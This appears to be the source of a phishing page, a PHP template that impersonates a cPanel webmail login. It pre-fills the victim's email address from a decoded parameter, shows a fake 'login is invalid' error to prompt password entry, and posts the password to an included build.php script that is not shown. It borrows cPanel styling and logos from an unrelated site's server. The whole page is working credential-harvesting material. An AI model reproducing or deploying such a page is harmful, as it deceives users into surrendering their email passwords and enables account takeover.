<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html lang="en" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
    <meta name="google" content="notranslate" />
    <meta name="apple-itunes-app" content="app-id=1188352635" />
    <title>Webmail Login</title>
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon" />

    <!-- EXTERNAL CSS -->
    <link href="https://completeplastics.com:2096/cPanel_magic_revision_1648610195/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css" />
    <link href="https://completeplastics.com:2096/cPanel_magic_revision_1676932296/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css" />

    <style type="text/css">
/*
  This css is included in the base template in case the css cannot be loaded because of access restrictions
  If this css is updated, please update securitypolicy_header.html.tmpl as well
*/
    .copyright {
        background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
        background-size: 25px auto;
    }

    #login-status.error-notice, #login-status.answers-notice, #login-status.warn-notice, #login-status.info-notice, #login-status.success-notice, #IE-warning.warn-notice {
        padding: 0;
    }

    #login-status {
        display: table;
        width: 100%;
    }

    .error-notice, #failure {
        background-color: #d35351;
        color: #fff;
    }

    .error-notice, .answers-notice, .warn-notice, .info-notice, .success-notice, #failure {
        -khtml-border-radius: 4px;
        border-radius: 4px;
        font-size: 12px;
        min-height: 27px;
        padding: 5px 10px 5px 5px;
    }
    </style>
    <!--[if IE 6]>
    <style type="text/css">
        img {
            behavior: url(/cPanel_magic_revision_1475783731/unprotected/cp_pngbehavior_login.htc);
        }
    </style>
    <![endif]-->

    <script>
    window.DOM = { get: function(id) { return document.getElementById(id) } };
    </script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body class="wm">
<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[invalid_session]  -->
<div id="login-wrapper" class="group ">
    <div class="wrapper">
    <div id="notify">  
        <div id="login-status" class="error-notice" style="<?php echo $error; ?> opacity: 1;">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                    <div id="login-status-message">The login is invalid, please try again.</div>
                </div>
            </div>
        </div>
        <div id='login-status' class="info-notice" style="visibility: hidden; opacity: 0;">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                    <div id="login-status-message">Authenticating …</div>
                </div>
            </div>
        </div>
    </div>

    <div style="display:none">
        <div id="locale-container" style="visibility:hidden">
            <div id="locale-inner-container">
                <div id="locale-header">
                    <div class="locale-head">Please select a locale:</div>
                    <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
                </div>
                <div id="locale-map">
                    <div class="scroller clear">
                        
                            <div class="locale-cell"><a href="#">English</a></div>
                        
                            <div class="locale-cell"><a href="#">العربية</a></div>
                        
                            <div class="locale-cell"><a href="#">čeština</a></div>
                        
                            <div class="locale-cell"><a href="#">dansk</a></div>
                        
                            <div class="locale-cell"><a href="#">Deutsch</a></div>
                        
                            <div class="locale-cell"><a href="#">Ελληνικά</a></div>
                        
                            <div class="locale-cell"><a href="#">español</a></div>
                        
                            <div class="locale-cell"><a href="#">español latinoamericano</a></div>
                        
                            <div class="locale-cell"><a href="#">español de España</a></div>
                        
                            <div class="locale-cell"><a href="#">suomi</a></div>
                        
                            <div class="locale-cell"><a href="#">Filipino</a></div>
                        
                            <div class="locale-cell"><a href="#">français</a></div>
                        
                            <div class="locale-cell"><a href="#">עברית</a></div>
                        
                            <div class="locale-cell"><a href="#">magyar</a></div>
                        
                            <div class="locale-cell"><a href="#">i_en</a></div>
                        
                            <div class="locale-cell"><a href="#">Bahasa Indonesia</a></div>
                        
                            <div class="locale-cell"><a href="#">italiano</a></div>
                        
                            <div class="locale-cell"><a href="#">日本語</a></div>
                        
                            <div class="locale-cell"><a href="#">한국어</a></div>
                        
                            <div class="locale-cell"><a href="#">Bahasa Melayu</a></div>
                        
                            <div class="locale-cell"><a href="#">norsk bokmål</a></div>
                        
                            <div class="locale-cell"><a href="#">Nederlands</a></div>
                        
                            <div class="locale-cell"><a href="#">polski</a></div>
                        
                            <div class="locale-cell"><a href="#">português</a></div>
                        
                            <div class="locale-cell"><a href="#">português do Brasil</a></div>
                        
                            <div class="locale-cell"><a href="#">română</a></div>
                        
                            <div class="locale-cell"><a href="#">русский</a></div>
                        
                            <div class="locale-cell"><a href="#">svenska</a></div>
                        
                            <div class="locale-cell"><a href="#">ไทย</a></div>
                        
                            <div class="locale-cell"><a href="#">Türkçe</a></div>
                        
                            <div class="locale-cell"><a href="#">українська</a></div>
                        
                            <div class="locale-cell"><a href="#">Tiếng Việt</a></div>
                        
                            <div class="locale-cell"><a href="#">中文</a></div>
                        
                            <div class="locale-cell"><a href="#">中文（台湾）</a></div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="content-container">
        <div id="login-container">

            <div id="login-sub-container">
                    <div id="login-sub-header">
                        
                        <img class="main-logo" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDYycHQiIGhlaWdodD0iMzIwIiB2aWV3Qm94PSIwIDAgMTQ2MiAyNDAiPgogIDxkZWZzPgogICAgPGNsaXBQYXRoIGlkPSJhIj4KICAgICAgPHBhdGggZD0iTTEzMzkgMGgxMjIuNDR2MjQwSDEzMzl6bTAgMCI+PC9wYXRoPgogICAgPC9jbGlwUGF0aD4KICA8L2RlZnM+CiAgPHBhdGggZD0iTTM2NS4xMDIgMTQuMzk4bC00My4yMDQgMTYwLjIwNGMtMi41OTcgOS41OTctNi41OTcgMTguNDUtMTIgMjYuNTQ2LTUuMzk4IDguMTAyLTExLjg0NyAxNS0xOS4zNDcgMjAuNzA0LTcuNSA1LjctMTUuODU1IDEwLjE1Mi0yNS4wNSAxMy4zNDctOS4yIDMuMjAyLTE4LjggNC44LTI4LjggNC44SDBMNjAuMyAxMy41Yy45OTctMy45OTYgMy4xNTMtNy4yNDYgNi40NS05Ljc1QzcwLjA1IDEuMjU0IDczLjggMCA3OCAwaDMyLjEwMmMzLjc5NiAwIDYuODQ3IDEuNSA5LjE0OCA0LjUgMi4yOTcgMyAyLjk1IDYuMyAxLjk1IDkuODk4bC00NC43IDE2Ni44aDYwLjg5OGw0NS0xNjcuNjk4YzEtMy45OTYgMy4xNTMtNy4yNDYgNi40NTQtOS43NSAzLjI5Ni0yLjQ5NiA2Ljk0NS0zLjc1IDEwLjk1LTMuNzVoMzIuMzk3YzMuNzk2IDAgNi43OTYgMS41IDkgNC41IDIuMTk4IDMgMi44IDYuMyAxLjggOS44OThsLTQ0LjcgMTY2LjhIMjM0LjljNy4yMDQgMCAxMy42NTMtMi4xNDMgMTkuMzUyLTYuNDQ4IDUuNy00LjI5NyA5LjQ1LTkuOTQ1IDExLjI1LTE2Ljk1bDM4LjctMTQ0LjNjMS0zLjk5NiAzLjE1Mi03LjI0NiA2LjQ0OC05Ljc1IDMuMy0yLjQ5NiA3LjA1LTMuNzUgMTEuMjUtMy43NUgzNTRjMy43OTcgMCA2Ljg1MiAxLjUgOS4xNDggNC41IDIuMjk3IDMgMi45NTQgNi4zIDEuOTU0IDkuODk4TTQxNC41OTggMTE2LjI1Yy0yLjQwMyAxLjkwMi00LjEwMiA0LjM1Mi01LjEwMiA3LjM1MmwtMTMuNSA1MWMtLjggMi44LS4zIDUuMzk4IDEuNSA3Ljc5NiAxLjgwNSAyLjQwMyA0LjIgMy42MDIgNy4yIDMuNjAyaDEyNC4yMDJsLTkuNTk3IDM1LjdjLTEuNjA1IDUuNDAyLTQuNjA1IDkuOC05IDEzLjE5OC00LjQwNSAzLjQwNy05LjQwNSA1LjEwMi0xNSA1LjEwMkgzODIuMTk2Yy04LjIwMyAwLTE1LjcwMy0xLjc1LTIyLjUtNS4yNS02LjgtMy40OTYtMTIuNDUtOC4yLTE2Ljk1LTE0LjEwMi00LjUtNS44OTQtNy42LTEyLjU5Ny05LjMtMjAuMDk3LTEuNjktNy41LTEuNDQ1LTE1LjE1Mi43NS0yMi45NDhsMTguMy02OC4xMDJjMS45OTctNy4zOTUgNS4xMDMtMTQuMiA5LjMwNi0yMC4zOTggNC4xOTYtNi4yIDkuMTQ1LTExLjUgMTQuODQ4LTE1LjkwMyA1LjctNC4zOTUgMTIuMDk4LTcuODQ1IDE5LjItMTAuMzQ4IDcuMDk3LTIuNSAxNC40NS0zLjc1IDIyLjA1LTMuNzVoODAuMDk4YzguMiAwIDE1LjcgMS43OTYgMjIuNSA1LjM5OCA2LjggMy42MDIgMTIuNDUgOC4zIDE2Ljk1IDE0LjEwMiA0LjUgNS44IDcuNTQ2IDEyLjUgOS4xNTIgMjAuMDk3IDEuNTk3IDcuNjA1IDEuMzk0IDE1LjMtLjYwMiAyMy4xbC01LjM5OCAyMC40Yy0yLjQwMyA5LTcuMjUgMTYuMjUzLTE0LjU0NyAyMS43NS03LjMwOCA1LjUwMy0xNS41NTggOC4yNS0yNC43NSA4LjI1aC05MC42MDVsNi0yMi4yYzEuNDAzLTUuMzk4IDQuMy05Ljc5NyA4LjcwMy0xMy4yIDQuNC0zLjM5OCA5LjQ5Ny01LjEgMTUuMjk3LTUuMUg0NzcuM2MzLjM5NSAwIDUuNTk1LTEuNjk2IDYuNTk4LTUuMDk4bDEuMi00LjVjLjU5Ny0yLjIuMi00LjIwNC0xLjItNi0xLjQwMi0xLjgtMy4yMDMtMi43MDQtNS40MDItMi43MDRoLTU1LjhjLTMgMC01LjcuOTU0LTguMDk4IDIuODUyTTYxOS40OTIgMGM0LjIwMyAwIDggLjg5OCAxMS40MDMgMi43IDMuMzk4IDEuOCA2LjIgNC4xNTUgOC40MDIgNy4wNSAyLjE5NSAyLjkwMiAzLjc1IDYuMjU0IDQuNjQ4IDEwLjA1LjkgMy44MDIuNzUgNy43MDQtLjQ1MyAxMS43bC0zOS44OTggMTQ5LjdoNTAuNzAzYzcuMTk1IDAgMTMuNTk4LTIuMTk2IDE5LjE5NS02LjU5OCA1LjYwMi00LjQgOS40MDMtMTAuMDk4IDExLjQwMy0xNy4xMDIgMS4zOTQtNC45OTYgMS41NDYtOS44OTguNDUtMTQuNy0xLjEwMy00LjgtMy4xMDMtOS4wNDYtNi0xMi43NS0yLjkwNC0zLjY5OC02LjUtNi42OTgtMTAuNzk4LTktNC4zMDUtMi4yOTYtOS4wNTUtMy40NDgtMTQuMjUtMy40NDhoLTIuMTAyYy00LjYgMC04LjIwMy0xLjc1LTEwLjgtNS4yNS0yLjYwMi0zLjQ5Ny0zLjQwMy03LjQ1LTIuNDAzLTExLjg1MmwxMS40MDMtNDEuN2g2LjU5N2MxNC42MDIgMCAyNy45NSAzLjE1IDQwLjA1NSA5LjQ1IDEyLjA5OCA2LjMgMjIuMTQ0IDE0LjY1MiAzMC4xNDggMjUuMDUgNy45OTYgMTAuNCAxMy41IDIyLjMwNSAxNi41IDM1LjcgMyAxMy40MDIgMi41OTQgMjcuMTA1LTEuMjAzIDQxLjEwMmwtMS4xOTUgNC41Yy0yLjYwNiA5LjU5Ny02LjY1MiAxOC40NS0xMi4xNTIgMjYuNTQ2LTUuNTA0IDguMTAyLTEyIDE1LTE5LjUgMjAuNzA0LTcuNSA1LjctMTUuODU2IDEwLjE1Mi0yNS4wNSAxMy4zNDctOS4yIDMuMjAyLTE4LjgwMiA0LjgtMjguNzk4IDQuOGgtOTYuNjAyYy00LjIwMyAwLTcuOTUzLS44OTgtMTEuMjUtMi43LTMuMy0xLjgtNi4xLTQuMTQ4LTguMzk4LTcuMDUtMi4zMDUtMi44OTUtMy44NTYtNi4yNDYtNC42NTItMTAuMDUtLjc5Ny0zLjc5OC0uNy03LjY5Ni4zLTExLjdMNTkwLjk5MiAwaDI4LjVNNzM5LjE5IDIyNS44OThsNDQuNDA0LTE2Ni43OTZIOTczLjE5YzE0LjYgMCAyNy45NSAzLjE0OCA0MC4wNDggOS40NSAxMi4xMDIgNi4zIDIyLjE1MyAxNC42NSAzMC4xNTMgMjUuMDUgOCAxMC40MDIgMTMuNSAyMi4zIDE2LjUgMzUuNyAzIDEzLjQgMi41OTggMjcuMS0xLjIgNDEuMDk2bC0xNS4zIDU2LjQwM2MtMSA0LjAwNS0zLjE1MiA3LjItNi40NSA5LjU5OC0zLjMgMi40MDMtNi45NTIgMy42MDItMTAuOTUyIDMuNjAyaC0zMi4zOTRjLTMuOCAwLTYuOC0xLjQ1LTktNC4zNTItMi4yMDMtMi44OTQtMi44MDUtNi4xNDgtMS44LTkuNzVsMTcuOTk1LTY4LjA5N2MxLjQtNC45OTUgMS41NS05LjkwMi40NDgtMTQuNjk4LTEuMDk3LTQuOC0zLjA0Ny05LjA0Ny01Ljg0My0xMi43NS0yLjgwNS0zLjctNi40MDctNi43LTEwLjgtOS00LjQwNC0yLjI5Ny05LjIwNC0zLjQ1NC0xNC40MDQtMy40NTRoLTE5LjVMOTIxLjU5NSAyMjYuOGMtMS4wMDQgNC4wMDUtMy4xNTMgNy4yLTYuNDUgOS41OTgtMy4zIDIuNDAzLTcuMDUgMy42MDItMTEuMjUgMy42MDJoLTMyLjFjLTMuODAyIDAtNi44NTMtMS40NS05LjE1LTQuMzUyLTIuMzA0LTIuODk0LTIuOTUzLTYuMTQ4LTEuOTUzLTkuNzVsMjkuMTAzLTEwOGgtNjAuODk4TDc5OS43OTMgMjI2LjhjLTEuMDA0IDQuMDA1LTMuMTQ4IDcuMi02LjQ1IDkuNTk4LTMuMyAyLjQwMy03LjA1IDMuNjAyLTExLjI1IDMuNjAyaC0zMi4xYy0zLjU5OCAwLTYuNTU2LTEuNDUtOC44NDgtNC4zNTItMi4yOTctMi44OTQtMi45NTQtNi4xNDgtMS45NTQtOS43NU0xMjIwLjk4OCAxMjEuOGwuOTAzLTMuM2MuNC0xLjU5OC4xNS0yLjk1LS43NS00LjA1LS45MDItMS4wOTUtMi4xNTItMS42NS0zLjc1LTEuNjVoLTk3LjVjLTQuMiAwLTgtLjkwMi0xMS40MDItMi42OTgtMy40MS0xLjgtNi4yLTQuMTUzLTguMzk4LTcuMDUtMi4yMS0yLjktMy43MS02LjI1LTQuNS0xMC4wNTItLjgtMy43OTctLjcxLTcuNjk1LjMtMTEuN2w2LTIyLjhoMTMyYzguMiAwIDE1LjcgMS44IDIyLjUgNS4zOTggNi43OSAzLjYwMiAxMi40NSA4LjMgMTYuOTUgMTQuMTAyIDQuNSA1LjgwNSA3LjYgMTIuNDUgOS4zIDE5Ljk1IDEuNjg4IDcuNSAxLjU0IDE1LjI1My0uNDUgMjMuMjVsLTIzLjcwMiA4OC4xOThjLTIuMzk4IDktNy4yNSAxNi4zMDUtMTQuNTQ3IDIxLjkwMy03LjMxIDUuNjAyLTE1LjY1IDguNC0yNS4wNSA4LjRsLTk3LjUtLjMwMmMtOC42IDAtMTYuNS0xLjg0My0yMy43LTUuNTQ2LTcuMjAyLTMuNy0xMy4xLTguNTk4LTE3LjcwMi0xNC43MDQtNC42MS02LjA5Ny03Ljc5Ny0xMy4wOTMtOS41OTctMjEtMS44LTcuODk0LTEuNi0xNS45NDUuNTk4LTI0LjE0OGwxLjIwMy00LjVjMS4zODgtNS41OTggMy43NS0xMC44IDcuMDQ4LTE1LjYwMiAzLjMtNC43OTYgNy4xNTMtOC44OTQgMTEuNTUtMTIuMjk2IDQuMzkyLTMuNDAzIDkuMzAyLTYuMDQ3IDE0LjctNy45NTQgNS40MDMtMS44OTQgMTEuMTAyLTIuODQ3IDE3LjEwMi0yLjg0N2g4MS44OThsLTYgMjIuNWMtMS42MSA1LjQtNC42MSA5LjgwMi05IDEzLjItNC4zOTggMy40MDItOS40MSA1LjEwMi0xNSA1LjEwMmgtMzYuNTk3Yy0zLjQxIDAtNS42IDEuNy02LjYgNS4wOTctLjYgMi4yMDItLjIgNC4xNTUgMS4xOTggNS44NSAxLjM5IDEuNzA0IDMuMTkyIDIuNTUyIDUuNDAzIDIuNTUyaDU5LjA5OGMyLjIwMyAwIDQuMDktLjYwMiA1LjcwMy0xLjggMS42LTEuMiAyLjYtMi43OTggMy00LjgwMmwuNi0yLjM5OCAxNC42OTgtNTQuM00xMzIwLjI5IDMwLjg5OGw0LjUtMTcuMzk4YzEtMy45OTYgMy4xNS03LjI0NiA2LjQ0OC05Ljc1IDMuMy0yLjQ5NiA3LjA1LTMuNzUgMTEuMjUtMy43NWgzMi40MDNjMy41OTggMCA2LjU1IDEuNSA4Ljg0OCA0LjUgMi4zIDMgMi45NTMgNi4yIDEuOTUzIDkuNjAybC00LjggMTcuN2MtMS4wMSA0LjAwMy0zLjE1MiA3LjI1LTYuNDUgOS43NS0zLjMgMi41MDMtNi45NTIgMy43NS0xMC45NTIgMy43NWgtMzIuMzk4Yy0zLjggMC02LjgtMS41LTktNC41LTIuMjEtMy0yLjgtNi4zMDItMS44LTkuOTA0ek0xMjY0LjQ4NyAyNDBsMzguNDAzLTE0NC4zYzEuNC01LjQgMy42NS0xMC4zNDggNi43NS0xNC44NDggMy4wOTgtNC41IDYuNzUtOC40MDMgMTAuOTUtMTEuNzA0IDQuMi0zLjI5NiA4Ljg5LTUuODQ3IDE0LjEtNy42NDggNS4yLTEuOCAxMC42LTIuNyAxNi4yLTIuN2gyMi44bC0zOC43MDIgMTQ0LjMwMmMtMS4zOTggNS4zOTgtMy42NDggMTAuMzQ3LTYuNzUgMTQuODQ3LTMuMTEgNC41LTYuNzUgOC40MDItMTAuOTUgMTEuNjk4LTQuMTk4IDMuMy04Ljg5NyA1Ljg1Mi0xNC4wOTcgNy42NTMtNS4yMSAxLjgwMi0xMC42MTIgMi43LTE2LjIwMiAyLjdoLTIyLjUiIGZpbGw9IiNmZjZjMmMiPjwvcGF0aD4KICA8ZyBjbGlwLXBhdGg9InVybCgjYSkiPgogICAgPHBhdGggZD0iTTEzMzkuNzkgMjQwbDYwLjMtMjI2LjVjLjk4OC0zLjk5NiAzLjE0OC03LjI0NiA2LjQ1LTkuNzUgMy4zLTIuNDk2IDcuMDUtMy43NSAxMS4yNS0zLjc1aDMyLjFjMy43OSAwIDYuODQgMS40NTMgOS4xNSA0LjM1MiAyLjI4OCAyLjkwMiAyLjk0IDYuMTQ4IDEuOTQ4IDkuNzVsLTQ1IDE2Ny4wOTdjLTIuMjA3IDguODA0LTUuNzU4IDE2LjgtMTAuNjQ4IDI0LTQuOTEgNy4xOTgtMTAuNzEgMTMuMzUtMTcuNCAxOC40NDgtNi43MSA1LjEwMi0xNC4xNSA5LjEwNi0yMi4zNSAxMi04LjIxIDIuOTAzLTE2LjggNC4zNTItMjUuOCA0LjM1MiIgZmlsbD0iI2ZmNmMyYyI+PC9wYXRoPgogIDwvZz4KPC9zdmc+Cg==" alt="logo" />
                        
                    </div>
                    <div id="login-sub">
                        <div id="clickthrough_form" style="visibility:hidden">
                            <form action="javascript:void(0)">
                                <div class="notices"></div>
                                <button type="submit" class="clickthrough-cont-btn">Continue</button>
                            </form>
                        </div>
                        <div id="forms">
                            <form novalidate id="login_form" action="" method="post" target="_top" style="visibility:none">
                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus="autofocus" value="<?php echo htmlspecialchars($decoded); ?>" placeholder="<?php echo htmlspecialchars($decoded); ?>" class="std_textbox" type="text" autocomplete="off" tabindex="1" required readonly>
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass" id="password" placeholder="Enter your email password." class="std_textbox" type="text" tabindex="2" autocomplete="off" required>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                    </div>
                                </div>
                                <div class="clear" id="push"></div>
                            </form>
                        <!--CLOSE forms -->
                        </div>
                    <!--CLOSE login-sub -->
                    </div>
                    

                    <!--CLOSE wrapper -->
                </div>
            <!--CLOSE login-sub-container -->
            </div>
        <!--CLOSE login-container -->
        </div>
        
                <div id="locale-footer">
            <div class="locale-container">
                <noscript>
                    <form method="get" action=".">
                        <select name="locale">
                            <option value="">Change locale</option>
